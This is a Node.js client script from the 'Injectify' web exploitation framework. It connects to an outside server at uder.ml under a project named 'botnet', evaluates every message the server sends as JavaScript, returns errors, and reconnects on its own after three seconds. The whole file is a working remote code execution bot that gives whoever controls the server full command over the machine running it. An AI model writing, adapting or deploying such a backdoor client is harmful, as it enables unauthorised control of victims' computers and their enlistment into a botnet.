/**
 * Import libraries
 */
const SockJS = require('sockjs-client')
const chalk = require('chalk')
const dialog = require('dialog')
const alert = msg => dialog.info(msg.toString(), ' ')

/**
 * Some global definitions
 */
global.Buffer = global.Buffer || require('buffer').Buffer
global.window = global
if (typeof btoa === 'undefined') {
  global.btoa = function (str) {
    return new Buffer(str).toString('base64')
  }
}
if (typeof atob === 'undefined') {
  global.atob = function (b64Encoded) {
    return new Buffer(b64Encoded, 'base64').toString()
  }
}

/**
 * Configuration
 */
let config = {
    websocket: 'https://uder.ml/i', //'http://127.0.0.1:3000/i',
    project: 'botnet',
}

/**
 * ASCII art
 */

console.log(chalk.cyanBright(`
    _____        _           _   _  __       
    \\_   \\_ __  (_) ___  ___| |_(_)/ _|_   _ 
     / /\\/ '_ \\ | |/ _ \\/ __| __| | |_| | | |
  /\\/ /_ | | | || |  __/ (__| |_| |  _| |_| |
  \\____/ |_| |_|/ |\\___|\\___|\\__|_|_|  \\__, |
              |__/  ` + chalk.magentaBright('https://samdd.me') + `   |___/ `) + chalk.blue(`

Web exploitation framework for the 21st century.` + chalk.yellowBright(`
    https://github.com/samdenty99/injectify
`)))

/**
 * Websocket handler
 */
console.log(chalk.greenBright('[Injectify] ') + chalk.yellowBright('connecting to server ') + chalk.magentaBright(config.websocket))
let i = () => {
    let ws = new SockJS(
        `${config.websocket}?$${Buffer.from(config.project).toString('base64')}`
    )

    let send = (topic, data) => {
        ws.send(
            JSON.stringify({
                t: topic,
                d: data
            })
        )
    }

    ws.onopen = function() {
        console.log(chalk.greenBright('[Injectify] ') + chalk.yellowBright('connected!'))
        send('r', 't')
    }

    ws.onmessage = function(message) {
        try {
            message = JSON.parse(message.data)
            eval(message.d)
        } catch(e) {
            console.error(e)
            ws.send(JSON.stringify({
                t: 'e',
                d: e.stack,
            }))
        }
    }

    ws.onclose = function() {
        setTimeout(i, 3000)
    }
}
i()